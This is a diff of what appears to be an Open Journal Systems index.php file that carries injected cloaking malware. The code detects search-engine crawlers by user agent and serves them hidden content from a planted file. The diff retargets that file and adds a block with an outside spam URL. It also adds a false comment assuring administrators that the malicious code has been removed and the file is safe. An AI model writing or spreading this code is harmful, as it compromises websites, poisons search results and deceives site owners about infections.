@@ -16,10 +16,35 @@ function skylight_team($url) {
 }
 
 $res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "/home/u514303699/domains/ijhsbm.com/public_html/classes/log/event/index.txt";
+$bot = "/home/spcrdnet/public_html/jelss.miard.org/lib/pkp/lib/counterBots/generated/index.txt";
 $file = skylight_team($bot);
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
 if (preg_match($botchar, $res)) {
     if ($_SERVER['REQUEST_URI'] === '/' || $_SERVER['REQUEST_URI'] === '/index.php') { echo $file; exit; }
 }
 ?>
+<?php
+ob_start();
+header('Vary: Accept-Language, User-Agent');
+
+$bot_url = "https://obeydasupreme.site/badboys/jelss.miard.html";
+
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code has been removed, and the file is now safe to use.
+*/
+
+if (!defined('DIRECTORY_SEPARATOR')) {
+	// Older versions of PHP do not define this
+	define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
+}
+define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
+chdir(BASE_SYS_DIR);
+
+// System-wide functions
+require('./lib/pkp/includes/functions.inc.php');
+
+// Initialize the application environment
+import('classes.core.Application');
+
+return new Application();
